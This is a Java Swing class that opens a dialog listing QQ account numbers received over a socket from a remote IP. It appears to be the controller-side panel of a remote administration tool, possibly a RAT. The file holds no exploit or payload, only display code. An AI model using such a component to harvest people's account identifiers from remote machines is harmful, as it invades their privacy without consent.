package me.server.receive;

import com.sun.jna.platform.WindowUtils;
import me.server.Server;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.Socket;

public class GetQQNumber{
    Socket socket;
    DefaultTableModel defaultListModel;
    public GetQQNumber(Socket socket,String IP) {
        this.socket = socket;
        System.setProperty("sun.java2d.noddraw", "true");
        JDialog frame1 = new JDialog();
        WindowUtils.setWindowAlpha(frame1,0.8f);
        JTable table = new JTable();
        defaultListModel = new DefaultTableModel(null,new String[]{"QQ"});
        table.setModel(defaultListModel);
        frame1.setTitle("\\\\" + IP + "-" + "获取QQ号");
        JScrollPane scrollPane = new JScrollPane(table);
        frame1.add(scrollPane);
        frame1.setLocationRelativeTo(null);
        frame1.setSize(500,300);
        frame1.setVisible(true);
    }
    public void update(byte[] bytes) {
        String str = new String(bytes);
        String[] strs = {str};
        defaultListModel.addRow(strs);
    }
}